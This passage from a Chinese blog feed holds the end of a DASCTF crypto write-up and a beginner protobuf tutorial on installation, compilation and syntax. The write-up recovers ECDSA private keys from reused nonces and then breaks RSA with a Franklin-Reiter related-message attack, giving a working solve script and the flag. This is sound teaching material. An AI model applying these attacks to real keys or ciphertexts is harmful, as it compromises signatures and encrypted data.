使用的是特殊的椭圆曲线,其中G其实已知、p也其实已知、n也就是阶也已知</span></span><br><span class="line">G, n = curve.generator, curve.order</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(n))</span><br><span class="line"><span class="built_in">print</span>(curve.curve)</span><br></pre></td></tr></table></figure><ul><li>这题最主要的一个破解点就是重复使用<code>k1</code>和<code>k2</code>对数据进行签名</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">h, priv, k</span>): <span class="comment"># 进行签名操作</span></span><br><span class="line">    r = (k * G).x() % n</span><br><span class="line">    s = (inverse(k, n) * (h + r * priv)) % n</span><br><span class="line">    <span class="keyword">return</span> s, r</span><br><span class="line"></span><br><span class="line">s1, r1 = sign(h[<span class="number">0</span>], x1, k1) <span class="comment"># 对h[0]进行椭圆曲线数字签名</span></span><br><span class="line">s2, _  = sign(h[<span class="number">1</span>], x2, k1) <span class="comment"># 对h[1]进行椭圆曲线数字签名</span></span><br><span class="line">s3, r2 = sign(h[<span class="number">2</span>], x1, k2) <span class="comment"># 对h[2]进行椭圆曲线数字签名</span></span><br><span class="line">s4, _  = sign(h[<span class="number">3</span>], x2, k2) <span class="comment"># 对h[3]进行椭圆曲线签名</span></span><br></pre></td></tr></table></figure><ul><li>接下来对这个过程进行推导</li></ul><script type="math/tex; mode=display">s_1 = k_1^{-1}*(h_1+r_1*x_1) ~mod~n\\s_2 = k_1^{-1}*(h_2+r_1*x_2) ~mod~n\\s_3=k_2^{-1}*(h_3+r_2*x_1)~mod~n\\s_4=k_2^{-1}*(h_4+r_2*x_2)~mod~n\\</script><ul><li>由于式子中的这个都是一次的，所以其实我们可以将这个式子理解成为一个模<code>n</code>下的四元一次方程组，接下来先化简一下这个式子。这样我们就可以更容易看出来这个四元一次线性方程组。</li></ul><script type="math/tex; mode=display">s_1k_1 = h_1+r_1x_1~mod~n\\s_2k_1 = h_2+r_1x_2~mod~n\\s_3k_2 = h_3+r_2x_1~mod~n\\s_4k_2 = h_4+r_2x_2~mod~n\\\Rightarrow\\s_1k_1+0k_2-r_1x_1+0x_2 = h_1~mod~n\\s_2k_1+0k_2+0x_1-r_1x_2 = h_2~mod~n\\0k_1+s_3k_2-r_2x_1+0x_2 = h_3~mod~n\\0k_1+s_4k_2+0x_1-r_2x_2 = h_4~mod~n\\</script><ul><li>这样其实我们就可以构造一个模<code>n</code>意义下的矩阵，解出这个矩阵对应的线性方程组就可以得到$x_1,x_2$了：</li></ul><script type="math/tex; mode=display">\begin{bmatrix}s_1&0&-r_1&0&h_1\\s_2&0&0&-r_1&h_2\\0&s_3&-r_2&0&h_3\\0&s_4&0&-r_2&h_4\end{bmatrix}</script><ul><li>解出$x_1,x_2$之后就可以来看下一个加密步骤，这个比较简单考察的是<code>Franklin-Reiter攻击</code>，而且还是线性的，只要用<code>gcd</code>（普通多项式gcd算法不行，需要使用<code>H-gcd</code>）即可求得最大公因式$(x-m)$，就可以求出明文m了：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m = bytes_to_long(plaintext)</span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">N = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e, N) <span class="comment"># 进行一次RSA加密</span></span><br><span class="line">c2 = <span class="built_in">pow</span>(x1 * m + x2, e, N)  <span class="comment"># 对x1和x2配合m也进行一次RSA加密</span></span><br></pre></td></tr></table></figure><ul><li>最终<code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> SECP256k1</span><br><span class="line">n = SECP256k1.order</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">N = <span class="number">98472559301398326519521704898800552100670435952553618641467704945731627783624140484670366845550939866842528582954361836035593755351584272693016822204234859506655433796327589389300744153263194916217158205372375670404000164793308078231134726345672236542974067442646354084915978240909130405000905936105602786257</span></span><br><span class="line">c1 = <span class="number">40127670364311180283394426274113033719543797673129006844648567069726278369353910517424074073714346881895826377902772771837790964432434997986229629267700081564740160692151350365553131535789070670584548053624970689607275665921674708650254889369926426966093575171344082441699295255661725211366819524902641461331</span></span><br><span class="line">c2 = <span class="number">4958767685161688254408001463637498631434015989118088175006720150146904021732816429444998309662995333252926794359370922113211567042198257249974382506057347524044728912256607992806670035884054654064021329936092742390064660715742236775795950389452053770118911570676738879382827738088237377423216124023239179385</span></span><br><span class="line">h1, s1, r1 = (<span class="number">68926494835039378729440404424793589316085902585443402029912033361291851069895</span>, <span class="number">70264613994433317101824708333691569351293428290775945022557096997867421112623</span>, <span class="number">95467825458659408375936425122753380788640181504557006906236884175684680903422</span>)</span><br><span class="line">h2, s2, r1 = (<span class="number">99816429822339421445908151468618514820067970997726274244928092260385418279182</span>, <span class="number">27386247988345867998752358066350183725137348277248603318763377237810993039608</span>, <span class="number">95467825458659408375936425122753380788640181504557006906236884175684680903422</span>)</span><br><span class="line">h3, s3, r2 = (<span class="number">100471089356874379799029324099340355602511511524623953182021635156113287196537</span>, <span class="number">108271537842404710192407976239166854351892165018292127464175836717873395489565</span>, <span class="number">13940715298251935708383205669373172931583958487449924842542107474174521484127</span>)</span><br><span class="line">h4, s4, r2 = (<span class="number">53552261622392134420510144174810499568173979993026285111445672642139328877380</span>, <span class="number">100312693542625967610858608130705401648902828203826044299984002070083890684220</span>, <span class="number">13940715298251935708383205669373172931583958487449924842542107474174521484127</span>)</span><br><span class="line">A = matrix(Zmod(n), [[s1, <span class="number">0</span>, -r1, <span class="number">0</span>], [s2, <span class="number">0</span>, <span class="number">0</span>, -r1], [<span class="number">0</span>, s3, -r2, <span class="number">0</span>], [<span class="number">0</span>, s4, <span class="number">0</span>, -r2]])</span><br><span class="line">v = vector(Zmod(n), [h1, h2, h3, h4])</span><br><span class="line">k1, k2, x1, x2 = A.solve_right(v)</span><br><span class="line"><span class="built_in">print</span>(x1,x2)</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(N)[]</span><br><span class="line">f = x^e - c1</span><br><span class="line">g = (ZZ(x1) * x + ZZ(x2))^e - c2</span><br><span class="line"></span><br><span class="line">G = R(f._pari_with_name(<span class="string">&#x27;x&#x27;</span>).gcd(g._pari_with_name(<span class="string">&#x27;x&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">m = -<span class="built_in">list</span>(G.monic())[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">17754677231116188359396131937000664637388235962309739341039576063530375612219 79541650983569507936838949546074094434344869740141472134648391439474061318003</span></span><br><span class="line"><span class="string">b&#x27;DASCTF&#123;W5CErsMuFRuDGvRw2sKLrH7kIZjFUIa2LTZO1McZ4g8avbVDl0YBM3EWfuI8msMm&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="strange-rsa"><a href="#Strange-RSA" class="headerlink" title="Strange RSA"></a>Strange RSA</h2>]]></content>
    
    
    <summary type="html">前言：DAS今年终于有比赛了。做出一题，复现一题，鸽好久了。</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>protobuf学习1</title>
    <link href="http://iyheart.github.io/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/"/>
    <id>http://iyheart.github.io/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/</id>
    <published>2025-10-08T06:13:43.000Z</published>
    <updated>2025-10-15T06:21:39.267Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考文章：<a href="https://blog.csdn.net/t5y22/article/details/142169446">ProtoBuf详解_proto buf-CSDN博客</a></li><li>参考文章：<a href="https://protobuf.com.cn/installation/">Protocol Buffer 编译器安装 | Protocol Buffers 文档 - ProtoBuf 文档</a></li><li>参考博客：<a href="https://blog.csdn.net/weixin_74531333/article/details/140469169">【ProtoBuf】在 Windows / Linux 安装 ProtoBuf 编译器（超详细教程）-CSDN博客</a></li></ul><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p><code>protobuf</code>英文全称为Protocol Buffers，是Google的一种语言中立、平台中立、可扩展的结构化数据序列化机制。它类似于 JSON，但更小更快，并且能生成原生语言绑定。你只需一次性定义好你想要的数据结构，然后就可以使用专门生成的源代码，轻松地从各种数据流中读写你的结构化数据，并支持多种语言。</p><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><ul><li><p>序列化和反序列化对于学web的可能比较熟悉，但我不是学web的，所以简单介绍一下：</p><ul><li><p>序列化：就是将一个对象转换为字节序的过程;</p></li><li><p>反序列化：就是将一个字节序转换为一个完整对象的过程;</p></li><li>使用序列化的情况：<ol><li>存储数据：当你想把的内存中的对象状态保存到⼀个⽂件中或者存到数据库中时。</li><li>网络传输：网络直接传输数据，但是无法直接传输对象，所以要在传输前序列化，传输完成后反 序列化成对象。例如我们之前学习过socket编程中发送与接收数据。</li></ol></li><li>主流的序列化和反序列化工具有：XML、JSON、ProtoBuf;</li></ul></li></ul><h2 id="protobuf版本"><a href="#protobuf版本" class="headerlink" title="protobuf版本"></a>protobuf版本</h2><ul><li>目前<code>protobuf</code>的大版本只有<code>protobuf2</code>、<code>protobuf3</code>，这两个大版本。<code>protobuf</code>是开源的，其源代码和发行版都被放置在github仓库中，对应的网址：<a href="https://github.com/protocolbuffers/protobuf">protocolbuffers/protobuf: Protocol Buffers - Google’s data interchange format</a></li><li>通过翻找github上protobuf的发行版，会发现protobuf的版本号有<code>V x.y.z</code>以及下图所示的<code>V x.y</code>这种。<ul><li>其中<code>V x.y.z</code>，<code>x</code>表示主版本号，<code>y</code>表示次版本号，<code>z</code>表示补丁版本号。而通过翻阅后面会发现主版本号只出现<code>2、3</code></li><li>由于主版本号只出现<code>2、3</code>，所以更新到后面主版本号意义确实不太大了，所以就更换了版本号的命名方案，将版本号<code>3</code>给省略了，变成<code>x.y</code>的形式。这种形式默认是<code>protobuf3</code>。（图中<code>V 21.0</code>其实就是这种形式）</li><li>通过观察github仓库的版本，protobuf2的版本范围为：<code>v2.4.1</code>到<code>v2.6.1</code>，而protobuf3的版本范围为：<code>v3.0.0</code>到<code>v3.20.1</code>。而版本命名后的目前截止至<code>2025年10月11日</code>，protobuf的版本已经是从<code>v21.0</code>到<code>v33.0</code></li></ul></li><li>为了能用上新版本的一些功能以及向下兼容，所以在安装<code>protobuf</code>的时候最好还是安装最新版本，<code>protobuf3</code>是兼容<code>protobuf2</code>的。</li></ul><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251010025324870.png" alt="image-20251010025324870"></p><h2 id="protobuf工作原理"><a href="#protobuf工作原理" class="headerlink" title="protobuf工作原理"></a>protobuf工作原理</h2><p>使用步骤如下：</p><ol><li>编写.proto⽂件，⽬的是为了定义结构对象（message）及属性内容。</li><li>使⽤ protoc 编译器编译 .proto ⽂件，⽣成⼀系列接口代码，存放在新⽣成头⽂件和源⽂件中。 </li><li>依赖⽣成的接口。将编译⽣成的头⽂件包含进我们的代码中，使用编译器为我们生成的序列化，反序列化方法以及一些对消息字段进行读写的方法。</li></ol><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011082338701.png" alt="image-20251011082338701"></p><h2 id="protobuf环境搭建"><a href="#protobuf环境搭建" class="headerlink" title="protobuf环境搭建"></a>protobuf环境搭建</h2><p>所谓搭建protobuf环境，其实就是安装<code>protoc</code>编译器，以及Python相关的库，这样基本就可以在C语言中以及Python中使用protobuf结构体。</p><ul><li>下载ProtoBuf前一定要安装依赖库：<code>autoconf automake libtool curl make g++ unzip</code>，否则安装会出现问题。安装命令如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install autoconf automake libtool curl make g++ unzip -y</span><br></pre></td></tr></table></figure><ul><li>然后去到<code>protobuf</code>的<code>github</code>网站上的<code>releases</code>的网站上选择该选项并复制链接，这个博客的安装方法是<code>24年12月份</code>安装的，所以版本还没到<code>v30</code>甚至以上。<a href="https://github.com/protocolbuffers/protobuf/releases">Releases · protocolbuffers/protobuf</a></li></ul><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011083219938.png" alt="image-20251011083219938"></p><ul><li>然后在Linux下使用命令<code>wget</code>下载对应连接的压缩包，并且将压缩包解压出来。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/protocolbuffers/protobuf/releases/download/v29.1/protoc-29.1-linux-x86_64.zip</span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20241214223636850.png" alt="image-20241214223636850"></p><ul><li>先创建一个<code>protoc-29.1-linux-x86_64</code>文件夹用来存放，解压后的protbuf文件。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir protoc-29.1-linux-x86_64</span><br></pre></td></tr></table></figure><ul><li>之后对下载下来的压缩包进行解压，解压到指定文件，使用如下命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip ./protoc-29.1-linux-x86_64.zip -d ./protoc-29.1-linux-x86_64</span><br></pre></td></tr></table></figure><ul><li>然后进入该文件夹，将<code>bin/protoc</code>可执行文件和<code>include/google</code>目录分别放到<code>usr/local/bin</code>和<code>usr/local/include</code>目录下</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp ./protoc /usr/local/bin/</span><br></pre></td></tr></table></figure><ul><li>移动完之后执行<code>protoc --version</code>就会出现如下信息，这就代表着protoc成功安装完成了。</li></ul><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011083522423.png" alt="image-20251011083522423"></p><h2 id="protobuf编译"><a href="#protobuf编译" class="headerlink" title="protobuf编译"></a>protobuf编译</h2><ul><li>给出如下的<code>protobuf</code>代码，看看如何编译它，编译它后什么文件会输出出来，先不用理解代码中的内容。创建一个<code>.proto</code>文件。</li></ul><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">    <span class="type">string</span> name = <span class="number">2</span>;</span><br><span class="line">    <span class="type">string</span> email = <span class="number">3</span>;</span><br><span class="line">&#125;      </span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011090435753.png" alt="image-20251011090435753"></p><ul><li>接下来使用<code>protoc --python_out=. protobuf1.proto</code>，将该<code>protobuf1</code>文件给编译一下，发现编译后出现了一个<code>.py</code>文件。</li></ul><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011090542395.png" alt="image-20251011090542395"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span></span><br><span class="line"><span class="comment"># NO CHECKED-IN PROTOBUF GENCODE</span></span><br><span class="line"><span class="comment"># source: protobuf1.proto</span></span><br><span class="line"><span class="comment"># Protobuf Python Version: 5.29.1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Generated protocol buffer code.&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor <span class="keyword">as</span> _descriptor</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor_pool <span class="keyword">as</span> _descriptor_pool</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> runtime_version <span class="keyword">as</span> _runtime_version</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> symbol_database <span class="keyword">as</span> _symbol_database</span><br><span class="line"><span class="keyword">from</span> google.protobuf.internal <span class="keyword">import</span> builder <span class="keyword">as</span> _builder</span><br><span class="line">_runtime_version.ValidateProtobufRuntimeVersion(</span><br><span class="line">    _runtime_version.Domain.PUBLIC,</span><br><span class="line">    <span class="number">5</span>,</span><br><span class="line">    <span class="number">29</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;protobuf1.proto&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># @@protoc_insertion_point(imports)</span></span><br><span class="line"></span><br><span class="line">_sym_db = _symbol_database.Default()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(<span class="string">b&#x27;\n\x0fprotobuf1.proto\&quot;/\n\x04Test\x12\n\n\x02id\x18\x01 \x01(\x05\x12\x0c\n\x04name\x18\x02 \x01(\t\x12\r\n\x05\x65mail\x18\x03 \x01(\tb\x06proto3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_<span class="built_in">globals</span> = <span class="built_in">globals</span>()</span><br><span class="line">_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _<span class="built_in">globals</span>)</span><br><span class="line">_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, <span class="string">&#x27;protobuf1_pb2&#x27;</span>, _<span class="built_in">globals</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> _descriptor._USE_C_DESCRIPTORS:</span><br><span class="line">  DESCRIPTOR._loaded_options = <span class="literal">None</span></span><br><span class="line">  _<span class="built_in">globals</span>[<span class="string">&#x27;_TEST&#x27;</span>]._serialized_start=<span class="number">19</span></span><br><span class="line">  _<span class="built_in">globals</span>[<span class="string">&#x27;_TEST&#x27;</span>]._serialized_end=<span class="number">66</span></span><br><span class="line"><span class="comment"># @@protoc_insertion_point(module_scope)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>还可以编译成<code>.C</code>文件，以及<code>.CPP</code>文件，使用<code>protoc --c_out=. protobuf1.proto</code>将生成<code>.c</code>文件和<code>.h</code>文件。然后使用<code>protoc --cpp_out=. protobuf1.proto</code>就可以生成<code>.cc</code>文件和<code>.h</code>文件。</li></ul><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011091044219.png" alt="image-20251011091044219"></p><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011091336142.png" alt="image-20251011091336142"></p><div class="table-container"><table><thead><tr><th>编译指令</th><th>结果</th></tr></thead><tbody><tr><td><code>protoc --c_out=. protobuf1.proto</code></td><td>生成<code>.c</code>文件以及<code>.h</code>文件</td></tr><tr><td><code>protoc --python_out=. protobuf1.proto</code></td><td>生成<code>.py</code>文件</td></tr><tr><td><code>protoc --cpp_out=. protobuf1.proto</code></td><td>生成<code>.cc</code>文件以及<code>.h</code>文件</td></tr></tbody></table></div><h2 id="protobuf使用"><a href="#protobuf使用" class="headerlink" title="protobuf使用"></a>protobuf使用</h2><ul><li>现在已经将<code>protobuf</code>进行编译，编译成了其他语言的文件，那如何在编写其他语言的情况下使用这个<code>protobuf</code>文件。接下来的例子就是做一个实例了解一下如何使用。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意如果第一次编写的时候应该需要下载protobuf1_pb2.py文件所包含的库文件</span></span><br><span class="line"><span class="keyword">import</span> protobuf1_pb2</span><br><span class="line">msg = protobuf1_pb2.Test()</span><br><span class="line">msg.<span class="built_in">id</span> = <span class="number">123</span></span><br><span class="line">msg.name = <span class="string">&quot;张三&quot;</span></span><br><span class="line">msg.email = <span class="string">&quot;111@qq.com&quot;</span></span><br><span class="line"><span class="built_in">print</span>(msg) <span class="comment"># 结构化输出msg</span></span><br><span class="line"><span class="built_in">print</span>(msg.SerializeToString()) <span class="comment"># 序列化转成二进制字节形式</span></span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011093240496.png" alt="image-20251011093240496"></p><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="标量类型"><a href="#标量类型" class="headerlink" title="标量类型"></a>标量类型</h2><p><code>Protobuf</code>支持多种标量类型，具体如下表：</p><div class="table-container"><table><thead><tr><th>数据类型</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>int32</code>、<code>int64</code></td><td>32位或64位有符号整数</td><td><code>int age=1;</code></td></tr><tr><td><code>uint32</code>、<code>uint64</code></td><td>32位或64位无符号整数</td><td><code>uint32 id=2;</code></td></tr><tr><td><code>float</code></td><td>单精度浮点数</td><td><code>float score = 3;</code></td></tr><tr><td><code>double</code></td><td>双精度浮点数</td><td><code>double ratio = 4;</code></td></tr><tr><td><code>bool</code></td><td>布尔值</td><td><code>bool is_active = 5;</code></td></tr><tr><td><code>string</code></td><td>字符串</td><td><code>string name=6;</code></td></tr><tr><td><code>bytes</code></td><td>二进制数据</td><td><code>bytes data=7;</code></td></tr></tbody></table></div><h2 id="复合类型"><a href="#复合类型" class="headerlink" title="复合类型"></a>复合类型</h2><ul><li>枚举类型：用于定义一组命名常量。使用关键字<code>enum</code>进行定义。</li><li>消息类型：类似于结构体，用于定义复杂的数据结构。使用<code>message</code>关键字进行定义。</li></ul><p>例子1：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下面创建一个包含枚举类型的消息</span></span><br><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> my_package;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Person</span>&#123;</span><br><span class="line"><span class="comment">// 声明一个枚举类型,注意等号</span></span><br><span class="line"><span class="keyword">enum </span><span class="title class_">Gender</span> &#123; </span><br><span class="line">GENDER_UNKNOWN = <span class="number">0</span>;</span><br><span class="line">        MALE = <span class="number">1</span>;</span><br><span class="line">        FEMALE = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 消息类型开始定义</span></span><br><span class="line"><span class="type">string</span> name = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 定义一个Gender变量</span></span><br><span class="line">Gender gender = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例子2：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//枚举类型也能定义在消息类型的外面,可以作为多个消息类型中的一个枚举类型</span></span><br><span class="line"><span class="comment">// 系统角色的定义</span></span><br><span class="line"><span class="keyword">enum </span><span class="title class_">UserRole</span>&#123;</span><br><span class="line">USER_ROLE_UNKNOWN = <span class="number">0</span>; <span class="comment">// 默认值,未知角色</span></span><br><span class="line">USER_ROLE_ADMIN = <span class="number">1</span>;   <span class="comment">// 管理员</span></span><br><span class="line">USER_ROLE_EDITOR = <span class="number">2</span>;  <span class="comment">// 编辑者</span></span><br><span class="line">USER_ROLE_VIEWER = <span class="number">3</span>;  <span class="comment">// 仅查看者</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义消息结构</span></span><br><span class="line"><span class="keyword">message </span><span class="title class_">User</span>&#123;</span><br><span class="line"><span class="type">string</span> name = <span class="number">1</span>;</span><br><span class="line">UserRole role = <span class="number">2</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><ul><li>参考博客：<a href="https://www.cnblogs.com/niumachen/p/18630131">Protobuf 文件语法 - 牛马chen - 博客园</a></li></ul><h2 id="语法版本"><a href="#语法版本" class="headerlink" title="语法版本"></a>语法版本</h2><p>使用<code>syntax</code>指定<code>protobuf</code>的版本（<code>proto2</code>或<code>proto3</code>），目前推荐使用<code>proto3</code>。例子如下：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>; <span class="comment">// 使用protobuf3的版本</span></span><br><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>; <span class="comment">// 使用protobuf2的版本</span></span><br></pre></td></tr></table></figure><h2 id="包声明"><a href="#包声明" class="headerlink" title="包声明"></a>包声明</h2><p>使用<code>package</code>定义命名空间，避免不同模块间的命名冲突。例子如下：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> my_package;</span><br></pre></td></tr></table></figure><h2 id="导入其他文件"><a href="#导入其他文件" class="headerlink" title="导入其他文件"></a>导入其他文件</h2><p>使用<code>import</code> 导入其他的<code>.proto</code>文件中的定义。例子如下：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;common.proto&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>对于<code>protobuf</code>的注释和<code>C</code>语言是一样的，都是通过<code>//</code> 进行单行注释。以及通过<code>/**/</code>进行多行注释。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是protobuf的单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是protobuf的多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="定义与声明数据"><a 